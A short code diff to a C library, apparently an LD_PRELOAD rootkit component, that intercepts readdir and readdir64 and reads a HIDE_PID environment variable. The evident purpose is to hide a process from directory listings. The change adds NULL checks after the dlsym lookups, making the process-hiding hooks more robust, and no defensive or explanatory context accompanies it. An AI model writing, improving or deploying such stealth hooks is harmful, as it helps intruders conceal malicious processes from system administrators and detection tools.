@@ -24,6 +24,9 @@ static struct dirent64* (*orig_readdir64)(DIR *) = NULL;
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
         orig_readdir = dlsym(RTLD_NEXT, "readdir");
+        if (!orig_readdir) {
+            return NULL;
+        }
     }
     
     char *hide_pid = getenv("HIDE_PID");
@@ -42,6 +45,9 @@ struct dirent *readdir(DIR *dirp) {
 struct dirent64 *readdir64(DIR *dirp) {
     if (!orig_readdir64) {
         orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+        if (!orig_readdir64) {
+            return NULL;
+        }
     }
     
     char *hide_pid = getenv("HIDE_PID");
